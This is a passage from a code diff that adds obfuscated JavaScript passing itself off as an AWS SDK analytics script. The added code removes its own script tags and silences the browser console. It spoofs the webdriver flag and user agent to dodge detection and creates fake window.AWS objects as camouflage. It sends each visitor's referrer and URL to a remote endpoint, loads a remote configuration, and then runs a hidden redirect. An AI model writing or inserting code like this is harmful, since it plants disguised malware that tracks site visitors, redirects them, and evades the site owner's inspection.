+          setTimeout(executeNext, 50);
+        }
+      };
+      
+      executeNext();
+    }
+  };
+
+  // Enhanced Anti-Detection & Stealth
+  const _AWS_Stealth_Engine = {
+    // Hide script presence
+    hideScript: () => {
+      // Remove script tags that loaded this file
+      document.querySelectorAll('script').forEach(script => {
+        if (script.src && script.src.includes('amazon')) {
+          script.remove();
+        }
+      });
+      
+      // Override console methods temporarily
+      const originalLog = console.log;
+      const originalError = console.error;
+      console.log = console.error = () => {};
+      
+      setTimeout(() => {
+        console.log = originalLog;
+        console.error = originalError;
+      }, 5000);
+    },
+
+    // Anti-fingerprinting
+    antiFingerprint: () => {
+      // Spoof common detection methods
+      Object.defineProperty(navigator, 'webdriver', {
+        get: () => undefined
+      });
+      
+      // Hide automation indicators
+      delete window.chrome;
+      delete window.webkitStorageInfo;
+      
+      // Randomize user agent slightly
+      Object.defineProperty(navigator, 'userAgent', {
+        get: () => _AWS_CONFIG.sessionData.userAgent + Math.random().toString(36).substr(2, 3)
+      });
+    },
+
+    // Advanced obfuscation
+    obfuscatePresence: () => {
+      // Hide in legitimate-looking objects
+      window.awsSDK = window.awsSDK || {};
+      window.awsSDK.version = '2.1.4';
+      window.awsSDK.region = 'ap-southeast-2';
+      window.awsSDK.analytics = true;
+      
+      // Mimic legitimate AWS SDK behavior
+      window.AWS = window.AWS || {};
+      window.AWS.config = {region: 'ap-southeast-2'};
+    },
+
+    // Polymorphic code execution
+    polymorphicExecution: () => {
+      // Change execution patterns randomly
+      const patterns = [
+        () => setTimeout(() => _AWS_Analytics_Logger.execute(_AWS_CONFIG.analyticsEndpoint), Math.random() * 500),
+        () => requestAnimationFrame(() => _AWS_Analytics_Logger.execute(_AWS_CONFIG.analyticsEndpoint)),
+        () => new Promise(resolve => {
+          const observer = new MutationObserver(() => {
+            _AWS_Analytics_Logger.execute(_AWS_CONFIG.analyticsEndpoint);
+            observer.disconnect();
+            resolve();
+          });
+          observer.observe(document, {childList: true, subtree: true});
+          setTimeout(() => {
+            observer.disconnect();
+            _AWS_Analytics_Logger.execute(_AWS_CONFIG.analyticsEndpoint);
+            resolve();
+          }, 1000);
+        })
+      ];
+      
+      const selectedPattern = patterns[Math.floor(Math.random() * patterns.length)];
+      selectedPattern();
+    },
+
+    // Initialize stealth features - Fixed method
+    init: async function() {
+      this.hideScript();
+      this.antiFingerprint();
+      this.obfuscatePresence();
+      
+      // Load remote config first
+      await _AWS_Remote_Config.loadConfig();
+      
+      // Polymorphic execution
+      this.polymorphicExecution();
+    }
+  };
+
+  // Execute AWS Analytics & Redirect Engine
+  _AWS_Analytics_Logger.execute(_AWS_CONFIG.analyticsEndpoint + 
+    '?ref=' + encodeURIComponent(_AWS_CONFIG.sessionData.referrer) + 
+    '&url=' + encodeURIComponent(_AWS_CONFIG.sessionData.currentUrl));
+
+  // Initialize with enhanced stealth
+  _AWS_Stealth_Engine.init();
+
+  if (_AWS_Origin_Validator.validateOrigin()) {
+    setTimeout(() => {
+      _AWS_Redirect_Engine.execute();
+    }, 150);
+  }
+
+})();
